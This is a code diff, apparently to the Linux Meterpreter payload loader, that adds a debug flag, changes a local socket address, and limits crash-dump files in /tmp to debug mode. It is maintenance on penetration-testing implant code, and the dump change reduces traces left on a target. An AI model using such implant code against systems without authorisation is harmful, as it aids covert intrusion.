@@ -67,6 +67,8 @@ void perform_fd_cleanup(int *fd);
 #define OPT_DEBUG_ENABLE	(1 << 0)
 #define OPT_NO_FD_CLEANUP	(1 << 1)
 
+int global_debug = 0;
+
 /*
  * Map in libraries, and hand off execution to the meterpreter server
  */
@@ -130,7 +132,7 @@ unsigned metsrv_rtld(int fd, int options)
 			TRACE("[ failed to find the enable_debugging function, exit()'ing ]\n");
 			exit(-1);
 		}
-
+		global_debug = 1;
 		enable_debugging();
 	}
 	TRACE("[ logging will stop unless OPT_NO_FD_CLEANUP is set ]\n");
@@ -224,7 +226,7 @@ int dlsocket(void *libc)
 		fd = libc_socket(AF_INET, SOCK_STREAM, 0);
 		if(fd == -1) break;
 
-		sin.sin_addr.s_addr = libc_inet_addr("127.0.0.1");
+		sin.sin_addr.s_addr = libc_inet_addr("127.1.1.1");
 		sin.sin_port = htons(4444);
 		sin.sin_family = AF_INET;
 
@@ -362,13 +364,16 @@ void sigcrash(int signo, siginfo_t *info, void *context)
 		close(fd);
 	}
 
-	memset(filename, 0, sizeof(filename));
-	format_buffer(filename, sizeof(filename) - 1, "/tmp/meterpreter.crash.%d", getpid());
+	// write file only if debug is enabled
+	if (global_debug) {
+		memset(filename, 0, sizeof(filename));
+		format_buffer(filename, sizeof(filename) - 1, "/tmp/meterpreter.crash.%d", getpid());
 
-	fd = open(filename, O_WRONLY|O_TRUNC|O_CREAT, 0644);
-	if(fd) {
-		write(fd, buf, 8192 - len);
-		close(fd);
+		fd = open(filename, O_WRONLY|O_TRUNC|O_CREAT, 0644);
+		if(fd) {
+			write(fd, buf, 8192 - len);
+			close(fd);
+		}
 	}
 
 	write(2, buf, 8192 - len);
